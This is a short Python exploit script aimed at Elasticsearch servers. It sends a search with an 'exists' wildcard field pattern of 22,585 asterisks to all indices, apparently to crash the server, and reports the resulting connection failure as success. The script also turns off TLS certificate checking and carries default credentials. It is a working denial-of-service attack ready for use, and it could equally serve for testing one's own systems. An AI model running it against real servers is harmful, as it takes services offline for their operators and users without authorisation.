import requests

es_url = 'https://localhost:9200'  # Replace with your Elasticsearch server URL

verify_ssl = False

# if you are using basic auth
username = 'elastic'
password = 'changeme'
auth = (username, password)

# if you are using client certificates
cert = ('admin.crt.pem', 'admin.key.pem')

index_name = '*'
#index_name = 'data1'
search_query = {
    "query": {
        "exists": {
            "field": ("a" + "*" * 22585)
        }
    }
}
search_endpoint = f'{es_url}/{index_name}/_search'

print(f"[+] sending search query ..")
try:
    # if you use basic auth, replace cert=cert with auth=auth
    response = requests.get(search_endpoint, json=search_query, verify=verify_ssl,  cert=cert)
    print(f"[-] exploit failed.")
except:
    print(f"[+] exploit seems successful")



